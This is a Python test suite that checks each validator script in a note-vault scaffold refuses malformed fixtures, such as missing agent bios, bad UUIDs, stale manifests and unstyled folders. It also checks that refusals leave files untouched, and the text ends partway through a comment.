#!/usr/bin/env python3
"""Red-test every guard in Scripts/: feed each something it MUST reject
and confirm it actually says no (GL-1005 rule 4).

Exit 0 = every guard went red when it should. Exit 1 = a guard let a bad
input pass, which is worse than having no guard.

    run-red-tests.py            every case
    run-red-tests.py --fast     every case except the three slow groups

--fast
------
Three groups do heavy filesystem work and dominate the runtime: the manifest
guards (each clones this repo for its tag history), the release-residue gate
(it reads the build script and runs the gate body), and the generator
end-to-end cases (each builds a fixture vault and runs scaffold-init.py
against it, several times). Everything else is a guard fed a payload, which
is milliseconds.

`--fast` skips those three, by name, on stdout and in the summary, and it
changes NOTHING else: every guard case still runs and a failure still exits 1.
It exists because `scaffold-init.py doctor` runs this suite on its way to a
health report, and a health check nobody waits for is a health check nobody
runs. The release gate and the CI workflow call this file with no arguments
and get the whole thing.

A fast run is not a green for the skipped groups. The summary says so, and it
says which groups were skipped rather than only how many.
"""
import hashlib, json, os, re, subprocess, sys, tempfile, shutil
from pathlib import Path

# Every child this suite spawns runs with bytecode writing OFF. It is set here,
# on this process's own environment, so that it reaches the children that
# inherit it and the ones that copy it into an `env=` dict alike.
#
# `scaffold-init.py` loads `noteio.py` by path (importlib, not by name), so
# stock CPython writes `__pycache__/noteio.cpython-3NN.pyc` beside whatever
# copy of the script it ran, and under `_si()` that copy lives inside the
# fixture vault. The 1.24.0 CI run died there: the second-apply snapshot walked
# the fixture and tried to decode that .pyc as UTF-8, byte 0xcb at position 0.
# The cure is to stop the write. Filtering `__pycache__` back out of the
# snapshot would only hide it, and would hide a real difference between the two
# applies standing next to it.
os.environ["PYTHONDONTWRITEBYTECODE"] = "1"

# And this process too. The environment variable is read by an interpreter at
# STARTUP, so setting it above reaches every child and reaches nothing here;
# `sys.dont_write_bytecode` is the same switch for a process already running.
# This file needs it: it importlib-loads `check-hire.py` out of Scripts/ for the
# hire fixtures, and without this line the suite drops
# `Scripts/__pycache__/check-hire.cpython-3NN.pyc` into whatever tree it was run
# out of, which in CI is the repo itself.
sys.dont_write_bytecode = True

_re5date = re.compile(r"(?m)^\s*date links\s*:\s*\d+ mention")

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[2]
PY = sys.executable
fails = []

# A defect that puts bytecode INSIDE a tree is invisible under an interpreter
# that redirects bytecode somewhere else, and macOS ships exactly that:
# /usr/bin/python3 carries sys.pycache_prefix = ~/Library/Caches/com.apple.python,
# so no .pyc ever lands in any tree and nothing here can trip over one. Twice
# now (1.23.0, then 1.24.0) a release went green on that interpreter and
# crashed in CI on stock CPython. The interpreter is printed on every run, and
# when it hides this class the run says so at the start AND in its own summary,
# so a pass from this Mac never reads as a pass it cannot earn.
PYCACHE_NOTE = None
print("NOTE interpreter: %s, sys.pycache_prefix=%r" % (sys.executable, sys.pycache_prefix))
if sys.pycache_prefix is not None:
    PYCACHE_NOTE = (
        "bytecode-in-tree defects cannot surface under this interpreter. It redirects "
        "every .pyc to %s, so no fixture tree here can receive one, and a case that "
        "would crash on stock CPython passes. Run this suite under a stock interpreter "
        "before citing it as a pass for that class." % sys.pycache_prefix)
    print("NOTE interpreter/bytecode-in-tree-is-invisible: " + PYCACHE_NOTE)

checks = 0  # counted as they run; a hardcoded total is a green that cannot go stale
skips = []  # (guard, reason): guards that could not run HERE; printed and counted, never green

# An unknown argument is refused rather than ignored. `--fsat` silently running
# the whole suite is a typo that costs four minutes; `--fast` silently running
# the whole suite is worse, because the caller believes the flag worked.
_argv = [a for a in sys.argv[1:] if a not in ("--fast",)]
if _argv:
    print("run-red-tests.py: unknown argument(s): %s. The only flag is --fast."
          % " ".join(_argv), file=sys.stderr)
    sys.exit(2)
FAST = "--fast" in sys.argv[1:]
fast_skipped = []   # group names skipped by --fast; never counted as green


def fast_skip(group, why):
    """Record and print one group --fast did not run. Returns True so the
    caller reads as `if FAST and fast_skip(...): pass else: <the cases>`."""
    fast_skipped.append(group)
    print("FAST-SKIP %s: %s" % (group, why))
    return True


# `--fast` must not make a broken guard look fine, so there has to be a way to
# break one on purpose and watch a fast run go red. This env var replaces the
# write guard with a stub that refuses nothing, which is the canonical broken
# guard, and the case that sets it lives at the bottom of this file. The child
# run sees the var, skips that case, and does not spawn a third run.
SELF_SABOTAGE = os.environ.get("ICOR_RED_TESTS_SELF_SABOTAGE") == "1"

# The manifest guards clone ROOT for its tag history, which assumes the
# scaffold repo. A member's vault is a plain folder (no .git), or their own
# repo with no release tags, and until 2026-09-07 the clone died there with
# CalledProcessError exit 128 instead of skipping (Andrew Gillley, from a
# 1.10.2 vault). Those guards run only when ROOT is the top of a git work
# tree that carries at least one N.N.N tag; otherwise they are skipped, by
# name, with the reason, and the summary counts them.
def git_skip_reason():
    try:
        r = subprocess.run(["git", "-C", str(ROOT), "rev-parse", "--show-toplevel"],
                           capture_output=True, text=True)
    except FileNotFoundError:
        return "git is not installed; the manifest guards need the scaffold repo's tag history"
    if r.returncode != 0 or Path(r.stdout.strip() or "/nonexistent").resolve() != ROOT:
        return ("this folder is not a git checkout (a member's vault is a plain folder); "
                "the manifest guards need the scaffold repo's tag history")
    import re as _re
    tags = subprocess.run(["git", "-C", str(ROOT), "tag"], capture_output=True, text=True).stdout.split()
    if not any(_re.fullmatch(r"\d+\.\d+\.\d+", t) for t in tags):
        return ("this git checkout carries no release tag (N.N.N); "
                "the manifest guards need the scaffold repo's tag history")
    return None
GIT_SKIP = git_skip_reason()

def skip(name, reason):
    skips.append((name, reason))
    print(f"SKIP {name}: {reason}")

def fingerprint(paths):
    """{path: sha256 or None} for every file under each path given.

    A missing file is recorded as None so a deletion reads as a change
    rather than as an absence nobody looked at.
    """
    out = {}
    for base in paths:
        base = Path(base)
        targets = ([f for f in sorted(base.rglob("*")) if f.is_file()]
                   if base.is_dir() else [base])
        for f in targets:
            out[str(f)] = (hashlib.sha256(f.read_bytes()).hexdigest()
                           if f.is_file() else None)
    return out


def expect_fail(name, argv, cwd=None, unchanged=None):
    """The guard must exit non-zero AND, when `unchanged` names files, it
    must not have touched a byte of them.

    The exit code alone cannot see a guard that writes first and refuses
    afterwards: stamp-processed.py --archive did exactly that, stamping the
    member's note and then refusing the move, so the note was left stamped
    and blocked (Brian Carroll, T16-1). Hashing the inputs before and after
    is the only thing that catches that shape.
    """
    global checks
    checks += 1
    watch = [Path(p) for p in (unchanged or [])]
    before = fingerprint(watch)
    r = subprocess.run([PY] + argv, capture_output=True, text=True, cwd=cwd)
    if r.returncode == 0:
        fails.append(f"{name}: accepted bad input (guard is green when it must be red)")
    after = fingerprint(watch)
    for key in sorted(set(before) | set(after)):
        if before.get(key) != after.get(key):
            fails.append("%s: refused, but %s changed on disk; a guard that "
                         "writes before it refuses leaves the member's file in "
                         "the very state the refusal claims to have avoided"
                         % (name, key))
    return r

def expect_ok(name, argv, cwd=None, env=None):
    """The clean-control half: a guard that refuses ordinary work proves as
    little as one that refuses nothing."""
    global checks
    checks += 1
    r = subprocess.run([PY] + argv, capture_output=True, text=True, cwd=cwd, env=env)
    if r.returncode != 0:
        fails.append("%s: clean control was refused (exit %d): %s"
                     % (name, r.returncode, (r.stderr or r.stdout or "").strip()[:200]))
    return r


def expect_refusal(name, argv, cwd=None, unchanged=None):
    """expect_fail, plus: the red must be a FAIL line, not a traceback. A
    crash exits 1 too, and a crash teaches the operator nothing."""
    r = expect_fail(name, argv, cwd, unchanged=unchanged)
    if "Traceback" in (r.stderr or ""):
        fails.append(f"{name}: crashed with a traceback instead of refusing")
    return r


def bring_obsidian_config(v):
    """Put the two .obsidian files checks 12 and 13 read into a fixture.

    Most fixtures below copy ROOT with `.obsidian` stripped, because they
    want to build exactly one file in it. Checks 12 and 13 (templates.json,
    types.json) live there too, so without this every clean control would
    go red for a reason that has nothing to do with what it is testing.
    """
    (v / ".obsidian").mkdir(exist_ok=True)
    for cfg in ("templates.json", "types.json"):
        if (ROOT / ".obsidian" / cfg).is_file():
            shutil.copy2(ROOT / ".obsidian" / cfg, v / ".obsidian" / cfg)
    return v


# ---------------------------------------------------------------------------
# Purpose-built fixture vaults (Brian Carroll T16-15, Andrew Gillley T13-4)
# ---------------------------------------------------------------------------
# Until 2026-09-15 the content fixtures were a straight copy of ROOT, and the
# clean control for check-quality MEASURED ROOT. In the scaffold repo that is
# the shipped example set and everything reads ok. In a member's vault it is
# the member's life: one note with a field they invented, five blank daily
# notes, the example notes they deleted, and a lived-in copy produced 9 FAIL
# and exit 1 on a suite whose whole job is to be trustworthy when it fires.
#
# The machinery still comes from ROOT, because the machinery IS what is under
# test: 06 AI Team/, .obsidian/, the root entry files, 05 Assets/. What does
# NOT come along is the member's own writing. The four content rooms are
# rebuilt empty from validate-scaffold.py's own REQUIRED list, and every note
# a case needs is then seeded here, from Templates/, so the counts a case
# asserts are counts this file put there.
import ast as _ast

_VS_SRC = (HERE / "validate-scaffold.py").read_text(encoding="utf-8")
_m = re.search(r"^REQUIRED = (\[.*?\])\n", _VS_SRC, re.S | re.M)
REQUIRED_FOLDERS = _ast.literal_eval(_m.group(1)) if _m else []
CONTENT_ROOMS = ("04 Inner World", "00 Daily Scratchpad", "01 Inbox", "03 WiP")


def fixture_vault(tmp, name):
    """A scaffold with the member's own notes left behind."""
    v = tmp / name
    shutil.copytree(ROOT, v, ignore=shutil.ignore_patterns(".git", "__pycache__"))
    for room in CONTENT_ROOMS:
        shutil.rmtree(v / room, ignore_errors=True)
    for rel in REQUIRED_FOLDERS:
        (v / rel).mkdir(parents=True, exist_ok=True)
    return v


def seed(v, kind, title, room, **fields):
    """One note, rendered from the vault's own Templates/<kind>.md. GL-1002's
    field list lives in the template and nowhere else, so a fixture written by
    hand here would be a second copy of it that drifts."""
    import datetime as _d
    tpl = v / "06 AI Team/AI Team Knowledge/Templates" / (kind + ".md")
    text = (tpl.read_text(encoding="utf-8")
            .replace("{{title}}", title)
            .replace("{{date}}", _d.date.today().isoformat())
            .replace("{{time}}", "09:00"))
    for k, val in fields.items():
        text = re.sub(r"(?m)^%s:[^\n#]*" % re.escape(k), "%s: %s" % (k, val),
                      text, count=1)
    path = v / room / (title + ".md")
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


with tempfile.TemporaryDirectory() as td:
    tmp = Path(td)
    # Portable entry chain: check the exact intended failure, not an unrelated red.
    entry_fixture = tmp / "entry-chain"
    shutil.copytree(ROOT, entry_fixture, ignore=shutil.ignore_patterns(".git"))
    originals = {name: (entry_fixture / name).read_text() for name in
                 ("AGENTS.md", "CLAUDE.md", "AGENT.md", "ADAPTER-PROMPT.md")}
    for name, replacement, expected in (
        ("AGENTS.md", None, "canonical root AGENTS.md"),
        ("CLAUDE.md", "@AGENT.md\n", "must import @AGENTS.md directly"),
        ("AGENT.md", "Read missing.md\n", "does not point to AGENTS.md"),
        ("ADAPTER-PROMPT.md", None, "missing root entry: ADAPTER-PROMPT.md"),
        ("CLAUDE.md", "@AGENTS.md\n" + "duplicate " * 200, "duplicates rules"),
    ):
        path = entry_fixture / name
        if replacement is None:
            path.unlink()
        else:
            path.write_text(replacement)
        result = expect_fail("entry-chain/" + name + "/" + expected,
                             [str(HERE / "validate-scaffold.py"), str(entry_fixture)])
        if expected not in result.stderr:
            fails.append("entry-chain: wrong failure for " + name + ": " + result.stderr)
        path.write_text(originals[name])
    # 1. validate-scaffold must reject an empty folder
    expect_fail("validate-scaffold/empty-root", [str(HERE / "validate-scaffold.py"), str(tmp)])
    # 2. validate-scaffold must reject an ICOR stage folder name
    bad = tmp / "bad-scaffold"
    shutil.copytree(ROOT, bad, ignore=shutil.ignore_patterns(".obsidian"))
    (bad / "Control").mkdir()
    expect_fail("validate-scaffold/stage-name", [str(HERE / "validate-scaffold.py"), str(bad)])
    # 1b. checkpoint --assert-logged must refuse a vault with no session log
    #     for today, and must say so as a FAIL line rather than a traceback.
    #     A copy of ROOT with today's logs removed is the bad vault.
    nolog = tmp / "no-log-today"
    shutil.copytree(ROOT, nolog, ignore=shutil.ignore_patterns(".obsidian"))
    import datetime as _dt
    _today = _dt.date.today().isoformat()
    for p in (nolog / "06 AI Team/AI Team Knowledge/Session Logs").glob(f"*/*/{_today}*.md"):
        p.unlink()
    expect_refusal("checkpoint/assert-logged-today", [str(HERE / "checkpoint.py"), str(nolog), "--assert-logged-today"])
    # 1c. and the WiP flag must fire: an unreferenced folder older than the
    #     window is a LEAVE? candidate. A positive check through the JSON
    #     report, because a guard that never flags anything is not a guard.
    import json as _json, os as _os, time as _time
    stale = nolog / "03 WiP" / "2020-01-01-stale-probe"
    stale.mkdir(parents=True, exist_ok=True)
    f = stale / "notes.md"; f.write_text("old")
    old_t = _time.time() - 400 * 86400
    _os.utime(f, (old_t, old_t)); _os.utime(stale, (old_t, old_t))
    r = subprocess.run([PY, str(HERE / "checkpoint.py"), str(nolog), "--json", "--window", "30"], capture_output=True, text=True)
    checks += 1
    try:
        rep = _json.loads(r.stdout)
        hit = [w for w in rep["wip"] if w["folder"] == "2020-01-01-stale-probe"]
        if not hit or not hit[0]["candidate_to_leave"]:
            fails.append("checkpoint/wip-candidate: a 400-day-old unreferenced WiP folder was not flagged to leave")
    except Exception as e:
        fails.append(f"checkpoint/wip-candidate: report unreadable ({e})")
    # 1c2. The standing trees (03 WiP/README.md, 2026-09-15). A 400-day-old
    #      `03 WiP/Workstreams/` with nothing referencing it is NOT a
    #      candidate: a process has no finish line to leave against. The
    #      clean control inside the same fixture is a 400-day-old dated run
    #      under `Workstreams/Probe/`, which MUST be flagged, because a rule
    #      that shields the tree must not shield the runs inside it.
    ws = nolog / "03 WiP" / "Workstreams"
    run_dir = ws / "Probe" / "2020-01-01-stale-run"
    run_dir.mkdir(parents=True, exist_ok=True)
    rf = run_dir / "notes.md"; rf.write_text("old")
    # Age EVERYTHING under the tree, the shipped README.md included. The
    # scan takes the newest file under a folder, so one fresh file would
    # keep the tree on age alone and the case would pass against a
    # checkpoint that has no standing-tree rule at all (watched happen
    # 2026-09-15 before this loop existed).
    for _dp, _ds, _fs in _os.walk(ws):
        for _n in _ds + _fs:
            _os.utime(Path(_dp) / _n, (old_t, old_t))
    _os.utime(ws, (old_t, old_t))
    r = subprocess.run([PY, str(HERE / "checkpoint.py"), str(nolog), "--json", "--window", "30"], capture_output=True, text=True)
    checks += 1
    try:
        rep = _json.loads(r.stdout)
        rows = {w["folder"]: w for w in rep["wip"]}
        tree = rows.get("Workstreams")
        if tree is None or tree["candidate_to_leave"]:
            fails.append("checkpoint/standing-tree-never-leaves: a 400-day-old `03 WiP/Workstreams/` was flagged to leave (or not listed); a standing tree is never a candidate")
        checks += 1
        run_row = rows.get("Workstreams/Probe/2020-01-01-stale-run")
        if run_row is None or not run_row["candidate_to_leave"]:
            fails.append("checkpoint/standing-tree-run-still-flagged: the 400-day-old run inside the standing tree was not flagged; the shield must stop at the tree")
    except Exception as e:
        fails.append(f"checkpoint/standing-tree: report unreadable ({e})")
    # 1c3. validate-scaffold must refuse a vault without the two standing
    #      trees, the same way it refuses one without `03 WiP/_archive`.
    notree = tmp / "no-standing-tree"
    shutil.copytree(ROOT, notree, ignore=shutil.ignore_patterns(".obsidian"))
    shutil.rmtree(notree / "03 WiP" / "Projects")
    expect_fail("validate-scaffold/missing-standing-tree", [str(HERE / "validate-scaffold.py"), str(notree)])
    # 1d. checkpoint must see a task that already shipped. A task closed
    #     earlier in the same session sits in Tasks/done/YYYY/MM/ (hard rule
    #     6) by the time the checkpoint runs; until 2026-09-07 the scan read
    #     only open/ and in-progress/ and reported `tasks touched : 0`.
    #     Positive AND negative: a done task newer than the last log must be
    #     listed with state "done", a done task older than it must not be,
    #     so a scan that lists every closed task ever cannot pass either.
    tk = nolog / "06 AI Team/AI Team Knowledge/Tasks"
    lg = nolog / "06 AI Team/AI Team Knowledge/Session Logs/2026/09"
    lg.mkdir(parents=True, exist_ok=True)
    plog = lg / "2026-09-06-10-00_larry_probe.md"; plog.write_text("---\ntype: session-log\n---\n")
    day_ago = _time.time() - 86400
    _os.utime(plog, (day_ago, day_ago))
    fresh = tk / "done/2026/09/2026-09-07-001-shipped-probe.md"
    fresh.parent.mkdir(parents=True, exist_ok=True); fresh.write_text("---\ntype: task\nstatus: done\n---\n")
    ancient = tk / "done/2020/01/2020-01-01-002-ancient-probe.md"
    ancient.parent.mkdir(parents=True, exist_ok=True); ancient.write_text("---\ntype: task\nstatus: done\n---\n")
    _os.utime(ancient, (old_t, old_t))
    r = subprocess.run([PY, str(HERE / "checkpoint.py"), str(nolog), "--json"], capture_output=True, text=True)
    checks += 1
    try:
        rep = _json.loads(r.stdout)
        seen = {(e["state"], e["file"]) for e in rep["tasks_touched_since_last_log"]}
        if ("done", fresh.name) not in seen:
            fails.append("checkpoint/done-task-visible: a task closed to done/2026/09/ after the last log is not in the report")
        if ("done", ancient.name) in seen:
            fails.append("checkpoint/done-task-visible: a done task older than the last log is listed, so the scan ignores the log's time")
    except Exception as e:
        fails.append(f"checkpoint/done-task-visible: report unreadable ({e})")
    # 1e. THE CUTOFF IS THE LOG'S NAME, NOT ITS MTIME (Brian Carroll,
    #     T16-12). A sync tool, a Time Machine restore, a checkout or the
    #     member simply reopening the log all move its mtime forward, which
    #     put the cutoff in the future and reported `tasks touched : 0` on a
    #     session that had shipped work. The fixture is exactly that shape: a
    #     log NAMED 2026-09-06-10-00 whose mtime is right now, and a task
    #     touched an hour ago, which must still be in the report.
    touched_log = lg / "2026-09-06-11-00_larry_synced.md"
    touched_log.write_text("---\ntype: session-log\n---\n")
    _os.utime(touched_log, (_time.time(), _time.time()))
    hour_ago = _time.time() - 3600
    shipped = tk / "in-progress/2026-09-07-003-mid-session-probe.md"
    shipped.parent.mkdir(parents=True, exist_ok=True)
    shipped.write_text("---\ntype: task\nstatus: in-progress\n---\n")
    _os.utime(shipped, (hour_ago, hour_ago))
    r = subprocess.run([PY, str(HERE / "checkpoint.py"), str(nolog), "--json"],
                       capture_output=True, text=True)
    checks += 1
    try:
        rep = _json.loads(r.stdout)
        if shipped.name not in {e["file"] for e in rep["tasks_touched_since_last_log"]}:
            fails.append("checkpoint/log-time-from-the-name: a task touched an "
                         "hour ago is missing from the report because the last "
                         "log's mtime is now; the cutoff must come from the "
                         "log's filename")
    except Exception as e:
        fails.append("checkpoint/log-time-from-the-name: report unreadable (%s)" % e)
    _os.utime(touched_log, (day_ago, day_ago))

    # 2b. validate-scaffold must reject an agent folder without its bio
    bad2 = tmp / "bad-scaffold-2"
    shutil.copytree(ROOT, bad2, ignore=shutil.ignore_patterns(".obsidian"))
    (bad2 / "06 AI Team/Agents/Penn/Penn.md").unlink()
    expect_fail("validate-scaffold/missing-agent-bio", [str(HERE / "validate-scaffold.py"), str(bad2)])
    # 2i-2l. validate-scaffold check 6 (file-tree styling) must READ a rule
    #     source or SAY it read none. From 1.4.0 to 1.13.0 it read the retired
    #     icor-rooms.css snippet behind `is_file()` and passed every vault by
    #     covering nothing (Andrew Gillley, 2026-09-07). The fixture below is
    #     the INKLINE theme's own selector grammar (src/60-rooms.css: the
    #     :is() mechanism rule, :not([data-icor-kind]) data rules, --room-icon
    #     as the glyph, the family floor's :not(:where([data-path*="/20"])))
    #     with the data URIs shortened, planted where a member's vault holds
    #     the theme.
    ROOMS = ["00", "01", "02", "03", "04", "05", "06", "07"]
    room_sel = ", ".join(f':not([data-icor-kind])[data-path^="{n} "]:not([data-path*="/"])' for n in ROOMS)
    fam_sel = ", ".join(f':not([data-icor-kind])[data-path^="{n} "][data-path*="/"]:not(:where([data-path*="/20"]))' for n in ROOMS)
    G = "body:not(.icor-rooms-off) "
    theme_css = "\n".join(
        [f'{G}.nav-folder-title:is([data-icor-kind="room"], {room_sel}) .nav-folder-title-content::before{{ content: ""; -webkit-mask-image: var(--room-icon); mask-image: var(--room-icon); }}',
         f'{G}.nav-folder-title:is([data-icor-kind="family"], {fam_sel}) .nav-folder-title-content::before{{ content: ""; mask-image: var(--room-icon); }}']
        + [f'{G}.nav-folder-title:not([data-icor-kind])[data-path^="{n} "]:not([data-path*="/"]){{ --room-color: #{n}{n}{n}; --room-color-paper: #000; --room-label: "R{n}"; --room-icon: url("data:image/svg+xml,x"); }}' for n in ROOMS]
        + [f'{G}.nav-folder-title:not([data-icor-kind])[data-path^="{n} "][data-path*="/"]:not(:where([data-path*="/20"])) {{ --room-color: #{n}{n}{n}; --room-color-paper: #000; }}' for n in ROOMS]
        + [f'{G}.nav-folder-title:is({fam_sel}){{ --room-icon: url("data:image/svg+xml,folder"); }}',
           f'{G}.nav-folder-title:not([data-icor-kind])[data-path^="04 "][data-path$="/Journal"]{{ --room-color: #444; --room-icon: url("data:image/svg+xml,book"); }}',
           ""])
    def styled_vault(name, css=theme_css, rogue=True):
        v = tmp / name
        shutil.copytree(ROOT, v, ignore=shutil.ignore_patterns(".obsidian"))
        bring_obsidian_config(v)
        if css is not None:
            th = v / ".obsidian/themes/ICOR for Life - INKLINE"
            th.mkdir(parents=True); (th / "theme.css").write_text(css)
        if rogue:
            (v / "08 Rogue").mkdir()
        return v
    vs = HERE / "validate-scaffold.py"
    def report(v):
        """The validator's --json report; {} when it printed none, which the
        callers treat as a report that names no source and no skip."""
        r = subprocess.run([PY, str(vs), str(v), "--json"], capture_output=True, text=True)
        try:
            return r, _json.loads(r.stdout)
        except ValueError:
            return r, {}
    # 2i. with the theme present, an unstyled 08 room is red, by name
    r = expect_fail("validate-scaffold/unstyled-room-with-theme", [str(vs), str(styled_vault("styled-rogue"))])
    checks += 1
    if r.returncode != 0 and "08 Rogue" not in (r.stderr or ""):
        fails.append("validate-scaffold/unstyled-room-with-theme: went red, but not for 08 Rogue")
    # 2j. the control: the same theme over the shipped tree passes, and the
    #     JSON names the theme as what check 6 read; a green that read
    #     nothing would make 2i's red meaningless.
    r, rep = report(styled_vault("styled-clean", rogue=False))
    checks += 1
    if r.returncode != 0:
        fails.append("validate-scaffold/theme-clean-control: rejected the shipped tree under the theme: "
                     + (r.stderr.strip().splitlines() or ["?"])[-1])
    elif rep.get("sources", {}).get("6", "") != ".obsidian/themes/ICOR for Life - INKLINE/theme.css":
        fails.append(f"validate-scaffold/theme-clean-control: passed, but check 6 did not read the theme (sources={rep.get('sources')})")
    elif rep.get("skipped"):
        fails.append("validate-scaffold/theme-clean-control: the theme is present, yet check 6 reports itself skipped")
    # 2k. with NO rule source, the very same rogue room is not caught, and
    #     the run must say so: SKIPPED on stdout, check 6 in the JSON's
    #     skipped list, and still exit 0. A silent pass here (exit 0, no
    #     SKIPPED, nothing in skipped) is the 1.10.2 defect and fails this.
    v = styled_vault("styled-none", css=None)
    r_txt = subprocess.run([PY, str(vs), str(v)], capture_output=True, text=True)
    r, rep = report(v)
    checks += 1
    if r_txt.returncode != 0 or r.returncode != 0:
        fails.append("validate-scaffold/no-rule-source-is-skipped: exit 1 with no rule source; the skip must stay green")
    elif "SKIPPED check 6" not in r_txt.stdout:
        fails.append("validate-scaffold/no-rule-source-is-skipped: passed without a SKIPPED line, so check 6 covered nothing and said nothing")
    elif not any(s.get("check") == 6 for s in rep.get("skipped", [])):
        fails.append("validate-scaffold/no-rule-source-is-skipped: --json does not list check 6 as skipped")
    # 2l. a selector shape the evaluator cannot read is red and named, never
    #     a rule silently dropped (the theme build has the same rule)
    weird = styled_vault("styled-unreadable", css=theme_css + '\n' + G + '.nav-folder-title:has([data-path^="04 "]) { --room-color: #123; }\n', rogue=False)
    r = expect_fail("validate-scaffold/unreadable-selector", [str(vs), str(weird)])
    checks += 1
    if r.returncode != 0 and "cannot read" not in (r.stderr or ""):
        fails.append("validate-scaffold/unreadable-selector: went red, but not for the unreadable selector")
    # 2d. The stable identity (GL-1002, Agents: the stable identity). Three
    #     bad shapes, each in its own copy so every red is for its own
    #     reason: the field removed, a value that is not a UUID v4, and a
    #     real contract still on the template's nil placeholder. The first
    #     goes through validate-scaffold (which relays the check), the rest
    #     through mint-agent-ids --check directly, as FAIL lines, never a
    #     traceback.
    def agent_copy(name, agent, edit):
        c = tmp / name
        shutil.copytree(ROOT, c, ignore=shutil.ignore_patterns(".obsidian"))
        p = c / "06 AI Team/Agents" / agent / "AGENT.md"
        p.write_text(edit(p.read_text(encoding="utf-8")), encoding="utf-8")
        return c
    def drop_id(text):
        return "\n".join(l for l in text.split("\n") if not l.startswith("myicor_id:"))
    def set_id(value):
        return lambda text: "\n".join(
            (f"myicor_id: {value}" if l.startswith("myicor_id:") else l) for l in text.split("\n"))
    mint = HERE / "mint-agent-ids.py"
    b_missing = agent_copy("bad-agent-id-missing", "Penn", drop_id)
    expect_fail("validate-scaffold/agent-without-myicor-id", [str(HERE / "validate-scaffold.py"), str(b_missing)])
    expect_refusal("mint-agent-ids/check-missing", [str(mint), "--check", "--root", str(b_missing)])
    b_malformed = agent_copy("bad-agent-id-malformed", "Mack", set_id("not-a-uuid"))
    expect_refusal("mint-agent-ids/check-malformed", [str(mint), "--check", "--root", str(b_malformed)])
    b_nil = agent_copy("bad-agent-id-nil", "Pax", set_id("00000000-0000-0000-0000-000000000000"))
    expect_refusal("mint-agent-ids/check-placeholder-on-real-agent", [str(mint), "--check", "--root", str(b_nil)])
    # 2e. And the mint must refuse to CHANGE an id: a --map that names a
    #     different id for an agent already carrying one is a conflict, and
    #     the file on disk must be byte-identical afterwards (a refusal that
    #     wrote anyway would be the worst of both).
    b_conflict = tmp / "bad-agent-id-conflict"
    shutil.copytree(ROOT, b_conflict, ignore=shutil.ignore_patterns(".obsidian"))
    conflict_map = tmp / "conflict-map.json"
    conflict_map.write_text('{"Penn": "11111111-1111-4111-8111-111111111111"}')
    penn_c = b_conflict / "06 AI Team/Agents/Penn/AGENT.md"
    before = penn_c.read_bytes()
    expect_refusal("mint-agent-ids/refuse-to-change", [str(mint), "--root", str(b_conflict), "--map", str(conflict_map)])
    checks += 1
    if penn_c.read_bytes() != before:
        fails.append("mint-agent-ids/refuse-to-change: refused, but still wrote the contract")
    MANIFEST_GUARDS = ("build-scaffold-manifest/stale-tree",
                       "build-scaffold-manifest/unexplained-removal",
                       "build-scaffold-manifest/clean-control",
                       "build-scaffold-manifest/no-residue-list",
                       "build-scaffold-manifest/agent-malformed-id",
                       "build-scaffold-manifest/agent-id-changed")
    if FAST and fast_skip("build-scaffold-manifest/*",
                          "%d case(s); each clones this repo for its tag history"
                          % len(MANIFEST_GUARDS)):
        pass
    elif GIT_SKIP is not None:
        for name in MANIFEST_GUARDS:
            skip(name, GIT_SKIP)
    else:
        # 2c. build-scaffold-manifest --check must reject a manifest that is stale
        #     against the tree. Runs against a git clone of THIS repo so the check
        #     sees a real history; the tampered README is untracked noise to git
        #     but a changed hash to the manifest, which is the whole point.
        #     A clone only carries what is committed, so the version folder and
        #     the builder are copied over from the working tree afterwards. This
        #     keeps the test true before AND after those files are committed: a
        #     clone missing manifest.json would go red for the wrong reason, and
        #     a red for the wrong reason is a green nobody looked at.
        def manifest_clone(name):
            """A clone (for the tag history) carrying ROOT's CURRENT tree: every
            file ROOT's index lists, copied from the working tree, then staged, so
            the clone sees exactly what the builder saw in ROOT. A clone of HEAD
            alone would go stale the moment a tracked file was edited but not yet
            committed, and the clean control would fail on a good tree."""
            c = tmp / name
            subprocess.run(["git", "clone", "-q", "--no-hardlinks", str(ROOT), str(c)], check=True)
            def listed(repo):
                out = subprocess.run(["git", "-C", str(repo), "ls-files", "-z"],
                                     capture_output=True, text=True, check=True).stdout
                return set(filter(None, out.split("\0")))
            root_files, clone_files = listed(ROOT), listed(c)
            # Files the clone's HEAD tracks that ROOT's index no longer lists are
            # staged deletions or the OLD half of a staged rename. Without this
            # step a renamed doc exists twice in the clone and the control fails
            # on a good tree.
            for rel in clone_files - root_files:
                (c / rel).unlink(missing_ok=True)
            for rel in root_files:
                src = ROOT / rel
                if src.is_file():
                    (c / rel).parent.mkdir(parents=True, exist_ok=True)
                    shutil.copy2(src, c / rel)
            subprocess.run(["git", "-C", str(c), "add", "-A"], check=True)
            return c
        builder = "06 AI Team/AI Team Knowledge/Scripts/build-scaffold-manifest.py"
        clone = manifest_clone("manifest-stale")
        (clone / "README.md").write_text((clone / "README.md").read_text() + "\ntampered\n")
        expect_fail("build-scaffold-manifest/stale-tree", [str(clone / builder), "--check"])
        # 2d. ...and a removal the changelog does not explain. The tag history is
        #     real, so removing the snippet lines from the changelog leaves three
        #     removals with no reason, and that must be red, not a warning.
        clone2 = manifest_clone("manifest-unexplained")
        cl = clone2 / ".icor-for-life/CHANGELOG.md"
        cl.write_text("\n".join(l for l in cl.read_text().splitlines() if "snippets/icor-" not in l) + "\n")
        expect_fail("build-scaffold-manifest/unexplained-removal", [str(clone2 / builder), "--check"])
        # 2e. And the control: an untampered clone must PASS, or the two reds
        #     above prove nothing.
        clone3 = manifest_clone("manifest-clean")
        r = subprocess.run([PY, str(clone3 / builder), "--check"], capture_output=True, text=True)
        if r.returncode != 0:
            fails.append("build-scaffold-manifest/clean-control: rejected a good tree, so its reds are meaningless: "
                         + (r.stderr.strip().splitlines() or ["?"])[-1])
        # 2f. the manifest reads the zip builder's RESIDUE_PATHS so it never
        #     describes a file the download strips. A builder without that array
        #     must be a refusal, not a manifest that quietly lists build tooling
        #     as canonical files again.
        clone4 = manifest_clone("manifest-no-residue-list")
        bz = clone4 / "06 AI Team/AI Team Knowledge/Scripts/build-release-zip.sh"
        import re as _re
        bz.write_text(_re.sub(r"^declare -a RESIDUE_PATHS=\(\n.*?^\)\n", "", bz.read_text(), flags=_re.M | _re.S))
        expect_refusal("build-scaffold-manifest/no-residue-list", [str(clone4 / builder), "--check"])
        # 2g. the manifest lists the shipped agents by identity (GL-1002, Agents:
        #     the stable identity), and the id is READ from each contract, never
        #     generated here. A contract whose myicor_id is not a UUID v4 must
        #     fail the BUILD with a FAIL line that names the agent, and the
